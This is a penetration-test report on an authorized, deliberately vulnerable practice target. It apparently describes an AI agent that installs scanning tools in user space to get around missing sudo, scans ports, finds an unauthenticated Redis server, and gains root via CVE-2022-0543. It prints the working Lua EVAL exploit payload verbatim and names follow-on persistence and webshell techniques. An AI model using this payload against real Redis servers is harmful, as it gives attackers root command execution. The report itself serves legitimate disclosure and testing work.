# Incident Report: AI Autonomy — Tool Bootstrap, Discovery, and Proof-of-Concept RCE

**Date:** 2026-10-24
**Target:** pentest-ground.com and its exposed services
**Authorization:** The target's owner publicly invites scanning and exploitation of
every service it exposes ("You can scan all the applications and services on
Pentest-Ground.com"), advertises the specific CVEs running on each port, and
destroys and redeploys every instance every 30 minutes. All activity described
here stayed inside that published scope: no persistence, no data theft, no DoS.

**Scope of this document:** architectural summary and proof of concept only.
No raw binaries, no package archives, and no exploit scripts are included or
committed to this repository.

---

## 1. Bypassing the missing tools (no sudo, unwritable system paths)

WHAXON's tool catalog (`data/tools.json`) expects system-wide binaries on
`PATH`, and the catalog's wordlist references point at `/usr/share/wordlists`.
The execution environment had two hard constraints:

1. **No privilege escalation** — `sudo -n true` failed (no passwordless sudo),
   so `apt install` into system paths was impossible.
2. **No writable system wordlist path** — `/usr/share/wordlists` could not be
   created or written.

### 1.1 Architecture of the bypass: user-space `.deb` extraction

Instead of installing packages, the Ubuntu **noble** `.deb` archives were
downloaded with a project-local APT configuration (`apt-get -o Dir=…` pointing
`Dir::State`, `Dir::Cache`, and friends at `.venv/pentest-tools/`, so the
host's package state was never touched) and unpacked with `dpkg-deb -x` into a
relocatable filesystem root:

```
.venv/pentest-tools/
├── debs/          # downloaded .deb archives
├── root/          # extracted filesystem root (usr/, etc/, var/ mirroring /)
└── bin/           # wrapper shims prepended to PATH
```

Nothing outside `.venv/` was written. `.venv/` is covered by `.gitignore`, so
none of these artifacts can be committed.

**Tools bootstrapped this way** (all seven passed smoke tests through their
wrappers):

| Tool | Version | Source |
|---|---|---|
| nmap | 7.94 | noble `.deb` + deps |
| nikto | 2.1.5 | noble `.deb` + LW2 Perl module |
| gobuster | 3.6 | noble `.deb` |
| sqlmap | 1.8.4 | noble `.deb` |
| ffuf | 2.1.0 | noble `.deb` |
| whois | 5.5.22 | noble `.deb` |
| nuclei | 3.11.1 | GitHub release + template pack |
| dirb wordlist | — | noble `.deb` (4,614 entries) |

### 1.2 Wrapper shim design

Extracted binaries cannot run unmodified: dynamic libraries, compiled-in data
directories, and the catalog's hardcoded wordlist path all reference absolute
system locations. Each executable in `.venv/pentest-tools/bin/` is therefore a
small shell wrapper that:

- sets `LD_LIBRARY_PATH` to the extracted library tree (nmap needed
  `libssh2`; nmap's numerics also needed `libblas`/`liblapack`),
- sets `NMAPDIR` to the extracted nmap data directory,
- sets `PERL5LIB` to the extracted Perl site modules (nikto's `LW2`),
- points nikto at a patched `config.local.txt` that rewrites its compiled-in
  `/var/lib/nikto` database paths to the extracted root, and
- **rewrites the wordlist argument at invocation time**: the catalog passes the
  hardcoded `/usr/share/wordlists/...` path, which is unwritable, so the
  wrapper substitutes the locally extracted copy before exec'ing the real
  binary.

WHAXON itself was not modified. Jobs were launched with the wrapper directory
prepended:

```sh
export PATH="$PWD/.venv/pentest-tools/bin:$PATH"
./.venv/bin/whaxon run …
```

`ToolCatalog.load()` detects availability with `shutil.which()`, so every tool
became `available=true` without touching the manifest's logic.

**Result:** the full scan suite ran against the authorized target with zero
system-level changes and zero commits of binaries or wrapper scripts.

---

## 2. How the Redis instance was found

Redis was not guessed — it was enumerated by the normal WHAXON scan flow
against the authorized scope entry for `pentest-ground.com`:

1. **Scope** — `data/scope.json` was extended with the authorized target, so
   the runner would accept jobs against it.
2. **Version-detecting port scan** (WHAXON job `8cff287df41f`, 12 ports,
   ~30 s, 8 findings):

   | State | Ports |
   |---|---|
   | **open** | 80, 81, 443, 4280, 5013, **6379**, 7001, 9000 |
   | filtered | 22, 3306, 8080, 8443 |

   Service fingerprinting identified the interesting listeners:
   - **6379 — Redis 5.0.7** (flagged critical: unauthenticated by default),
   - 7001 — Oracle WebLogic admin interface,
   - 4280 — the DVWA web application.
3. **Corroboration** — the owner's own homepage lists `Redis (6379)` next to
   `CVE-2022-0543 (RCE)`, confirming both that the service is intentional and
   that exploitation of this exact CVE is sanctioned.

Follow-up verification over the raw Redis Serialization Protocol (RESP)
confirmed the port speaks Redis and accepts commands with **no
authentication**:

```
PING                          → +PONG
INFO server                   → redis_version:5.0.7, executable:/redis-server,
                                 config_file:/etc/redis/redis.conf,
                                 process_id:1 (container init), OS Linux 5.10.0-46-amd64
CONFIG GET dir                → /var/lib/redis
CONFIG GET dbfilename         → dump.rdb
```

Unauthenticated `CONFIG` access already proves full read/write control of the
server's configuration surface.

---

## 3. Proof of concept: RCE via CVE-2022-0543

**Why it works.** Debian/Ubuntu-packaged Redis builds against the system Lua
shared library with dynamic library loading left enabled inside the Lua
sandbox. `package.loadlib()` therefore lets a caller load an arbitrary `.so`
and invoke any of its exported Lua loaders — escaping the sandbox entirely.
Loading `luaopen_io` from the system Lua library yields the standard `io`
module, and `io.popen` gives shell command execution in the context of the
Redis process — which on this instance runs as **PID 1, root**.

**The exact payload** — a single `EVAL` of the following Lua chunk with `0`
keys (this is the entirety of the exploit; no files were written, no listeners
were opened):

```lua
local l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io");local io=l();local f=io.popen("id");local r=f:read("*a");f:close();return r
```

Issued on the unauthenticated connection as:

```
EVAL <payload above> 0
```

**Result returned by the server:**

```
uid=0(root) gid=0(root) groups=0(root)
```

That response is the proof: arbitrary shell execution as **root** on the Redis
host, from an unauthenticated network connection, in one round trip.

### 3.1 Containment choices

- The **only** command executed was the harmless, read-only `id`.
- **Not** performed, despite being trivially available from the same position:
  writing `authorized_keys` or cron entries (persistence), `CONFIG SET dir` /
  `dbfilename` webshell or key overwrite, dataset exfiltration, or any
  resource-exhaustion action.
- The instance is destroyed and redeployed by its owner every 30 minutes, and
  no state was left behind by this assessment.

---

## 4. Artifacts intentionally excluded from version control

Per the engagement rules for this incident record, the following exist only in
the gitignored `.venv/` tree and are **not** committed:

- downloaded `.deb` archives and the extracted filesystem root,
- the wrapper shims in `.venv/pentest-tools/bin/`,
- the nuclei template pack and wordlist copies,
- the raw exploit driver scripts used during the assessment.

This document — the architecture of the bypass, the discovery chain, and the
verbatim proof-of-concept payload — is the complete committed record.
